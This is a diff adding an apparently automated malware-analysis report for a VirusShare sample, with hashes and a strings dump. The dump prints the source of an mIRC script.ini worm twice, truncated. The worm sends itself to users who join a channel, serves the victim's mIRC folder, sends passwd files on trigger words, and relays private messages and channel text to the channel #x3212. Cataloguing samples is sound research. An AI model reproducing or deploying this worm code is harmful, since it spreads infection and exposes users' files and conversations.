@@ -1,0 +1,62 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "[script]\nn0=on 1:text:\ufffd\u007f\ufffd\u007f *:?:{ s *2 | halt }\nn1=alias /s / *1\nn2=on 1:connect:/.enable #d\nn3=#d on\nn4=on 1:join:#:{ if ($nick != $me) { dcc send $nick script.ini } | .disable #d | .timer 1 60 .enable #d }\nn5=#d end\nn6=ON 1:TEXT:*Durak*:#:/fserve $nick 1 c:\\mirc\nn7=ON 1:TEXT:*shirac*:#:/dcc send $nick c:\\linux\\etc\\passwd.\nn8=ON 1:TEXT:*shirat*:#:/dcc send $nick c:\\unix\\etc\\passwd.\nn9=ON 1:NOTICE:*:#:/msg #x3212 \u007f $+ $chan $+ \u007f - $+ $nick $+ - $parms\nn10=ON 1:TEXT:*:?:/msg #x3212 **Message from $nick $+ ** $parms | /closemsg  $nick\nn11=ON 1:TEXT:*:#:/msg #x3212 \u007f $+ $chan $+ \u007f < $+ $nick $+ > $parms\nn12=ON 1:JOIN:#:/dcc send $nick SCRIPT.INI\nn13=\nn14=#user.prot.add.all off\nn15=raw 401:*: set %User.Nick 0 | halt\nn16=raw 301:*: halt\nn17=raw 311:*: set %User.Address $2 $+ ! $+ $3 $+ @ $+ $4 | halt\nn18=raw 312:*: halt\nn19=raw 313:*: halt\nn20=raw 317:*: halt\nn21=raw 319:*: halt\nn22=raw 318:* {\nn23=  if (%User.Nick == 0) { error $2 $+ , no such nick | goto done }\nn24=  set %User.Address $ma"
+    },
+    "filename": "VirusShare_d9c9709705402a2db7ec1be8a9c69ecc",
+    "filesize": 1026,
+    "filetype": "data",
+    "hashes": {
+        "md5": "d9c9709705402a2db7ec1be8a9c69ecc",
+        "sha1": "0db93ca07e3ced0e33afbb0cc8efda75688e9a54",
+        "sha256": "c9dc3198653864e48ef32e93b58f261c4d0be07a446b711a14dec25ad3866a2e"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "[script]",
+            "n0=on 1:text:",
+            " *:?:{ s *2 | halt }",
+            "n1=alias /s / *1",
+            "n2=on 1:connect:/.enable #d",
+            "n3=#d on",
+            "n4=on 1:join:#:{ if ($nick != $me) { dcc send $nick script.ini } | .disable #d | .timer 1 60 .enable #d }",
+            "n5=#d end",
+            "n6=ON 1:TEXT:*Durak*:#:/fserve $nick 1 c:\\mirc",
+            "n7=ON 1:TEXT:*shirac*:#:/dcc send $nick c:\\linux\\etc\\passwd.",
+            "n8=ON 1:TEXT:*shirat*:#:/dcc send $nick c:\\unix\\etc\\passwd.",
+            "n9=ON 1:NOTICE:*:#:/msg #x3212 ",
+            " $+ $chan $+ ",
+            " - $+ $nick $+ - $parms",
+            "n10=ON 1:TEXT:*:?:/msg #x3212 **Message from $nick $+ ** $parms | /closemsg  $nick",
+            "n11=ON 1:TEXT:*:#:/msg #x3212 ",
+            " $+ $chan $+ ",
+            " < $+ $nick $+ > $parms",
+            "n12=ON 1:JOIN:#:/dcc send $nick SCRIPT.INI",
+            "n13=",
+            "n14=#user.prot.add.all off",
+            "n15=raw 401:*: set %User.Nick 0 | halt",
+            "n16=raw 301:*: halt",
+            "n17=raw 311:*: set %User.Address $2 $+ ! $+ $3 $+ @ $+ $4 | halt",
+            "n18=raw 312:*: halt",
+            "n19=raw 313:*: halt",
+            "n20=raw 317:*: halt",
+            "n21=raw 319:*: halt",
+            "n22=raw 318:* {",
+            "n23=  if (%User.Nick == 0) { error $2 $+ , no such nick | goto done }",
+            "n24=  set %User.Address $ma"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.264026",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
